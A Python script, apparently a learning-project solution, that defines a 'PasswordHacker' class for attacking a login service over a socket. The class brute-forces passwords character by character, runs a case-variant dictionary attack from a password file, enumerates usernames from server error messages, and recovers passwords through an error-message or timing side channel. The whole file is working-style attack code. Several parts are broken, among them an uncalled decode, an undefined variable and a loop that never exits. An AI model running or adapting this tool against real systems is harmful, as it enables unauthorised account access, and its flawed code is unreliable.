import socket
import sys
import itertools as it
import string
import json
import time

class PasswordHacker:
    def __init__(self):
        self.pwd_chars = string.ascii_lowercase + string.digits
        self.lg_chars = string.ascii_letters + string.digits
        self.s = socket.socket()

        
    def connect(self, hostname=None, port=None):
        try:
            hostname, port = sys.argv[1:]
        except ValueError:
            assert hostname is not None and port is not None
            
        self.s.connect((hostname, int(port)))

        
    def pwd_char_cracker(self, chars=None, success_message='Connection success!'):
        chars = chars if chars else self.pwd_chars

        for i in range(1, len(chars)+1):
            cbs = (''.join(i) for i in it.product(chars, repeat=i))

            for pwd in cbs:
                self.s.send(pwd.encode())

                if self.s.recv(1024).decode() == success_message:
                    return pwd


    def pwd_list_cracker(self, pwd_file='password.txt', success_message='Connection success!'):
        with open(pwd_file) as f:
            pwd_list = f.read().split('\n')

            for pwd in pwd_list:
                all_pwds = (''.join(p) for p in it.product(
                                                *zip(pwd.lower(), pwd.upper())))
                
                for sg_pwd in all_pwds:
                    self.s.send(sg_pwd.encode())

                    if self.s.recv(1024).decode == success_message:
                        return sg_pwd


    def lg_pwd(self, lg, pwd):
        return json.dumps({'login': lg, 'password': pwd})
    
    def lg_char_cracker(self, lg_file='logins.txt', chars=None, timing=False,
                                                                wrong_message='Wrong login!',
                                                                exception_message='Exception happened during login',
                                                                success_message='Connection success!'):
        chars, cracked_lg, cracked_pwd = chars if chars else lg_chars, '', ''

        with open(lg_file) as f:
            lg_list = f.read().split('\n')

            for lg in lg_list:
                self.s.send(self.lg_pwd(lg, '').encode())
                
                r = json.loads(self.s.recv(1024).decode())['result']
                
                if r != wrong_message:
                    cracked_lg = lg
                    break
            
            while 1:
                for c in chars:
                    self.s.send(self.lg_pwd(cracked_lg,
                                            cracked_pwd+c).encode())
                    r = json.loads(self.s.recv(1024).decode())['result']

                    if timing:
                        start = time.perf_counter()
                        action = self.s.recv(1024)
                        if time.perf_counter() - start >= 0.1:
                            cracked_pwd += c
                    else:
                        if r == exception_message:
                            cracked_pwd += c

                    if r == success_message:
                        break
        
        return self.lg_pwd(cracked_lg, cracked_pwd)


    def close(self):
        self.s.close()
                   
            
            
def main():
    ph = PasswordHacker()
    ph.connect()
    ph.pwd_char_cracker()
    ph.close()
    
if __name__ == '__main__':
    main()
